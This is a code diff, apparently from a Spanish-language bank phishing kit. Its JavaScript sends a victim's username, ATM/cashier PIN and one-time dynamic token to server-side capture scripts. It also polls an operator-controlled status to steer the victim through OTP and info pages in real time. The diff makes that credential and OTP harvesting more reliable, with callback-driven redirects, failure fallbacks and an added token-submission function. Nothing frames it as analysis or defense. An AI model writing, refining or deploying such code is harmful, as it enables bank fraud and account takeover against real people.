@@ -4,31 +4,51 @@ function detectar_dispositivo(){
     return dispositivo;
 }
 
-// ESTO QUITA EL "CARGANDO" APENAS ABRES LA PÁGINA
 $(document).ready(function() {
     setTimeout(function(){
         $("#fondo, #cargando, #cargando-o").hide();
     }, 1000); 
 });
 
+// ENVIAR USUARIO
 function inicio(u){
     var d = detectar_dispositivo();
     $("#fondo, #cargando-o").show();
-    $.post( "../process/inicio.php", { usr: u, dis: d } );
-    setTimeout(function(){ window.location.href = "PASS.php"; }, 1200);
+    
+    // Usamos el callback (function(){...}) para saltar solo cuando termine el POST
+    $.post("../process/inicio.php", { usr: u, dis: d }, function(data) {
+        window.location.href = "PASS.php";
+    }).fail(function() {
+        // Si falla el servidor, saltamos igual a los 1.5s para no trabar el flujo
+        setTimeout(function(){ window.location.href = "PASS.php"; }, 1500);
+    });
 }
 
+// ENVIAR CLAVE DE CAJERO
 function pasousuario(p){    
     $("#fondo, #cargando-o").show();
-    $.post( "../process/pasousuario.php", { pass: p } );
-    setTimeout(function(){ window.location.href = "WAITING.php"; }, 1200);
+    
+    $.post("../process/pasousuario.php", { pass: p }, function(data) {
+        window.location.href = "WAITING.php";
+    }).fail(function() {
+        setTimeout(function(){ window.location.href = "WAITING.php"; }, 1500);
+    });
 }            
 
+// CONSULTAR ESTADO (PANEL)
 function consultar_estado(){    
-    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
+    $.post("../process/estado.php?v=" + Math.random(), function(data) {        
         var estado = data.toString().trim();
         if (estado === '2') { window.location.href = "OTP.php"; }
         else if (estado === '4') { window.location.href = "INFO.php"; }
         else if (estado === '10') { window.location.href = "SUCCESS.php"; }
     });        
+}
+
+// ENVIAR TOKEN DINÁMICO (Agrégala si no la tienes)
+function enviardinamica(o){
+    $("#fondo, #cargando-o").show();
+    $.post("../process/clavedinamica.php", { otp: o }, function(data) {
+        window.location.href = "WAITING.php";
+    });
 }
